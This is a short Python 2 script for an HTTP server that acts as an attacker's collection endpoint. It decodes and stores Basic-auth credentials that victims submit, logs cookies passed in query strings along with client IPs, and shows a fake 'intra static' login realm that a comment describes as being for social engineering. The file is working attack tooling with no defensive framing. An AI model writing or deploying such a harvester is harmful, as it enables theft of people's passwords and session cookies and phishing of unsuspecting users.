from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from sqlstore import DB
from base64 import b64decode

store = DB()

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        authheadindex = 0
        clientheaders = str(self.headers).split('\n')
        clientip = str(self.client_address[0])
        for i in range(len(clientheaders)):
            if clientheaders[i][:13] == "Authorization":
                authheadindex = i
        if authheadindex:
            #self.log_message(clientheaders[authheadindex])
            cred_b64 = str(clientheaders[authheadindex].split(' ')[-1:])
            try:
                cred = b64decode(cred_b64)
            except TypeError:
                cred = "unabletodecodeb64:" + cred_b64
            username, password = cred.split(":")
            store.insert_cred(clientip, username, password)
            self.send_response(200)
            self.send_header('Content-type', 'image/bmp') #TODO: send 1x1px Image blob
            self.end_headers()
            bitmap_dump = open('bg.bmp', 'r').readlines()
            self.wfile.write(bitmap_dump[0])
        else:
            qmindex = self.path.find('?')+1
            if qmindex:
                cookies = self.path[qmindex:]
                #self.log_message(cookies)
                store.insert_cookie(clientip, cookies)
            self.send_response(401)
            self.log_message('sending 401 to: ' + clientip)
            self.send_header('WWW-Authenticate', 'Basic realm="intra static"') #provide a realm for better social eng.

def main():
    try:
        server = HTTPServer(('', 80), MyHandler)
        print 'Welcome to the machine...'
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
        server.socket.close()

if __name__ == '__main__':
    main()